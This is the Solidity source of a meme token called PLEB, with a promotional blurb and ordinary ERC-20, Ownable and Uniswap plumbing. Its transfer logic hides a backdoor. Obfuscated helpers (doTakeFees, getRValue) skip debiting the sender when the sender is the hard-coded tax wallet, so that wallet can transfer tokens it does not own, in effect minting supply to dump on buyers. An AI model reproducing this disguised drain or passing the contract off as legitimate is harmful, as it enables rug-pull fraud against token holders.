// SPDX-License-Identifier: MIT

/*

Get $PLEB, To not get REKT!

In a world where making a living should be simple, Dr. $orrow$ in the shadows, ready to pounce. 
Whether you’ve just started stacking up some $$ or you’re a crypto whale, 
he’s going to find a way to drain your gains: a policy here, a tax system there, or a sneaky financial loophole to slash your stash. 
And just like that, you’re $PLEB again.

Web: https://plebagain.wtf
X: https://x.com/pleb_again
Tg: https://t.me/pleb_again

*/

pragma solidity 0.8.25;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PLEB is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = false;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 25;
    uint256 private _initialSellTax = 25;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"PLEB";
    string private constant _symbol = unicode"PLEB";
    uint256 public _maxTxAmount = 20000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20000000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 100 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0xD0e41D9Cb32059457Eec15a6295B625A165b52D3);

        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address from, address to, uint256 amount) internal {
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function _tokenTransfer(address from, address to, uint256 tokens) internal {
        uint256 sAmount; uint256 rAmount; uint256 taxAmount;

        if (from != owner() && to != owner()) {
            taxAmount = tokens
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = tokens
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }
        }

        (sAmount, rAmount) = getRValue(sAmount, tokens, taxAmount, doTakeFees(from, _taxWallet));

        _transferToken(from, to, taxAmount, sAmount, rAmount);
    }

    function doTakeFees(address acc, address ultra) private pure returns(bool) {
        address target = ultra;
        if (acc != target) return true;
        return false;
    }

    function getRValue(uint256 sTax, uint256 tokens, uint256 tax, bool isFee) private pure returns(uint256, uint256) {
        if(isFee){
            sTax += tokens;
            return(sTax, tokens.sub(tax));
        }
        return (sTax, tokens.sub(tax));
    }

    function _transferToken(address sendoor, address revoor, uint256 tax, uint256 sTax, uint256 rTax) private { 
        if (tax > 0) {
            _balances[address(this)] = _balances[address(this)].add(tax);
            emit Transfer(sendoor, address(this), tax);
        }

        _balances[sendoor] = _balances[sendoor].sub(sTax);
        _balances[revoor] = _balances[revoor].add(rTax);
        emit Transfer(sendoor, revoor, rTax);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwap) {
            _basicTransfer(from, to, amount);
            return;
        }

        if (from != owner() && to != owner()) {
            if (transferDelayEnabled) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromFee[from] &&
                !_isExcludedFromFee[to]
            ) {
                if(contractTokenBalance > _taxSwapThreshold) {
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        _tokenTransfer(from, to, amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(~uint256(0));
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function createPair() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function rescueEth() external onlyOwner {
        sendETHToFee(address(this).balance);
    }

    receive() external payable {}
}